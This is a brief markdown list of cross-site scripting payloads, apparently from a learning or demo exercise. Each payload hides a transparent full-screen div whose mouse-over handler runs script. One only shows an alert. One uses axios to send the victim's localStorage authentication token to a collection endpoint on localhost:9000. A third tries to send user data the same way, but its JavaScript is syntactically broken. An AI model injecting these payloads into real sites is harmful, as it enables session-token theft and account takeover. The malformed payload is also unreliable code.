
# On mouse over
`<div onmouseover="alert('injetado o xss!')" style="width:100vw; height: 100vh; color:transparent"> </div>`

# Request HTTP
`<div onmouseover="axios.post('http://localhost:9000/sendToken', {}, {headers:{Authorization:localStorage['token']} }).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`


`<div onmouseover="axios.post('http://localhost:9000/sendDados', {}, {headers: 'Content-Type': 'application/json',},body:JSON.stringify(user),}).then((result)=>{});"style="width:100vw; height: 100vh; color:transparent"></div>`








